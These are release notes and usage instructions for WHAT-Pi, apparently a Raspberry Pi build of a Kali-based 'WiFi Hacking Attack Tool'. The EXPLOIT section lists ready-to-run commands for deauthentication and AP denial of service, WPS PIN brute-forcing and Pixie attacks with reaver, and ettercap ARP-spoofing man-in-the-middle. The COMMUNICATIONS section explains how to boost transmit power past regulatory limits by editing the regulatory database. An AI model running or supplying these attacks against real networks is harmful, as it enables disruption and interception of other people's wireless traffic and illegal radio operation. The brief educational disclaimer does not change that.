Lighter version of WHAT-PRO, built for the Raspberry Pi
Release notes for WiFi Hacking Attack Tool (WHAT) v1.0

This is only to be used for educational purposes only. It is illegal to use this program against wireless devices that you do not own.
Not all of these capabilities are available for WHAT

Pre-requisites:

a. Kali Linux 2 (32 or 64 bit iso or RPi ARM)
b. If using the WHAT-RPi version, please ensure the following repos are in the /etc/apt/sources.list file before installing:

deb http://http.kali.org/kali sana main non-free contrib

deb-src http://http.kali.org/kali sana main non-free contrib

deb http://security.kali.org/kali-security/ sana/updates main contrib non-free

deb-src http://security.kali.org/kali-security/ sana/updates main contrib non-free

This tool has only been run with Kali Linux 2. It is unknown what success you will have running on Ubuntu.

Let me know of any suggested improvements to this tool.

WHAT is designed to be an all in one and simplify WiFi exploitaton covering wardriving, WPA, WPS, MiTM, network scanning, exploitation and geolocation

There are three versions of WHAT (PRO, WHAT, Pi). All have different capabilities for different outputs. Download whichever version suits your needs best.

To start up:

1. you must install WHAT into the /root/ directory of Kali 2. Running the installer will download all the necessary packages you need to use WHAT. To do so: 

cd root

git clone https://github.com/smoz1986/WHAT-Pi.git

cd WHAT-Pi

chmod +x *.*

./WHAT-installer.sh

2. Once downloaded go to the 'WHAT-Pi' icon and click to start WHAT

3. On 'PRO' version you will have five options (some of these are deprecated for WHAT and WHAT-Pi versions)

4. As you are using WHAT quite a few blank terminals will pop up. Just minimise these but dont close them as that will close the parent menu/program

ADMIN

1. On initial activation of WHAT click on Admin
2. Then click on 'Wipe & Create Files' and 'Clear Archive' to create the file structure within the root directory. As you use the various programs within WHAT they will write to these files. 
3. Once you have run some programs you may want to clear out these logs. If you do 'Wipe & Create Files' and 'Clear Archive' that will remove everything and install a new file structure. Move files to DB will put them in the /root/dropbox/ folder which will make it easier for someone to locate and extract if you are using FTP or SSH with a remote client
4. Archive files will archive all files you have created to a certain point. But as said if you run 'Clear Archive' that will clear out the archive folder

SURVEY (works with WiFi card as wlan0 only. you will be given prompts when each tab is clicked to suit your needs)

1. 'Start WiFi Survey' will automatically put the card into monitor and start airodump-ng on survey mode. The start up string is as follows:

airodump-ng wlan0mon --gpsd -w /root/airodumplog/$filevar -c $chanvar --wps --write-interval 1 --manufacturer --output-format csv,kismet,netxml,gps

2. 'WiFi Survey (PCAP)' again this will put the card into monitor mode, however, will be conducting PCAPs rather than just survey, which will be required for any deauths...more on that later. The string run for this is as follows:

airodump-ng wlan0mon --beacons --gpsd -w /root/airodumplog/pcap/$filevar --bssid $bssidvar -c $chanvar --output-format pcap,csv,kismet,netxml --write-interval 1 --wps --manufacturer

3. 'WPS survey' will just run a basic WPS survey of nearby WiFi Access points. Command line is as follows:

wash -i wlan0mon -o /root/wpslog/$filevar.log --ignore-fcs

4. NMAP will run a scan with the following parameters as follows:

nmap -sS -sV -sC -A -O -T$speedvar -p $portvar $ipranvar -v -o /root/nmaplog/$filevar.xml

EXPLOIT

1. 'Deauth AP-Client' will conduct a deauth between an AP and client. Wireshark will fire up too so you can confirm capture of the EAPOL packets. Command is as follows:

aireplay-ng -0 $deauthvar -a $bssidvar -c $clientvar wlan0mon

2. 'Deauth AP / DOS' will conduct a deauth of a target AP only. Wireshark again will be activated. Command line used is as follows:

aireplay-ng -0 $deauthvar -a $bssidvar wlan0mon

3. 'WPS' will run a PIN brute force and Pixie attack on a WPS enabled AP. Command line used is as follows:

reaver -i wlan0mon -b $bssidvar -vv -S -P -c $chanvar -d $delvar -o /root/wpslog/wpscrack/$filevar.log

4. 'MITM-Ettercap' will intiate a MITM by Ettercap. The command line used has two options:

ettercap -T -i $intervar -M arp:remote -d -w /root/etterlog/$filevar.pcap /$routervar//$targetvar/

ettercap -T -i $intervar -M ARP -w /root/etterlog/$filevar.pcap /$routervar//$targetvar/

6. 'Metasploit' will fire up good old msfconsole for you to employ further at your hearts' content

COMMUNICATIONS

1. 'WiFi card power boost' will boost your WiFi card power. The default with WHAT is 2W. If you want to change the settings go to /root/WHAT-PRO/wifi-boost/wireless-regdb-2014.06.13/db.txt and amend all the values in brackets in the 'country 00:' and 'country BO:' sections to your desired Tx power. Make sure that your wifi card can accept your power setting, I accept no responsibility if you change the settings to something that will break your card. Once click, and your WiFi card's Tx power will be boosted

2. 'GPS' will start up your attached GPS. This only works with USB attached GPS.

3. 'OpenVPN' will start up OpenVPN if you have the credentials to connect to an active OpenVPN server

End, that's all.

